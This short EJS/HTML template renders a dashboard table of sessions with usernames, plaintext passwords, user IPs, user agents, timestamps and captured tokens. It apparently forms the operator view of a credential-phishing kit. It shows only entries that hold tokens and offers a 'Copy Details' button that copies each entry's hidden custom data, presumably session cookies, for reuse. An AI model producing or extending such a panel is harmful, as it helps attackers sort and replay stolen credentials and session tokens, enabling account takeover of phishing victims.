<div class="content">
    <div class="row">


    <div class="col-md-12" id="data-table">
    <div class="card">
        <div class="card-body">
            <table id="t01" class="table align-items-center table-flush">
                <thead class="thead-light">
                    <tr>
                        <th>Session</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>User IP</th>
                            <th>User Agent</th>
                            <th>Time</th>
                            <th>Tokens</th>
                    </tr>
                </thead>
                <tbody>
                    <% data.forEach(item => { %>
                        <% if (item.tokens) { %>
                        <tr>
                            <td style="word-break: break-all; font-size: 90%; padding: 20px 10px 20px 10px;">
                                <%= item.id %>
                            </td>
                            <td><%= item.username %></td>
                            <td><%= item.password %></td>
                            <td><%= item.remote_addr %></td>
                            <td><%= item.useragent %></td>
                            <td><%= new Date(item.create_time).toLocaleString() %></td>
                            <td>
                                <button onclick="copyDetails(this)" class="btn btn-sm btn-primary">
                                    Copy Details
                                    <span style="display: none"><%= JSON.stringify(item.custom) %></span>
                                </button>
                            </td>
                        </tr>
                        <% } %>
                        <% }) %>
                </tbody>
            </table>
        </div>
    </div>
</div>



